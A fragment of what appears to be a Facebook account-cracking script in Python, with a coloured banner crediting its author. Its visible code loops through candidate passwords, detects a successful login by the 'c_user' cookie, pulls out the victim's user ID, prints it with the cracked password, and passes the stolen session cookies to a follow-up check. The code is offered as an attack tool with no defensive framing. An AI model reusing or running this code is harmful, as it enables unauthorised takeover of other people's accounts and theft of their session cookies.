...
logo ="""\033[1;97m
       ...
       \033[1;33m##     ## #### ##     ## ######## 
\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mMR. AZAN
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mAZAN X. 
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mMR-AZAN
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[AXB-CP] '+cid+' | '+ps+'\033[0;97m')
                cek_apk(session,coki)
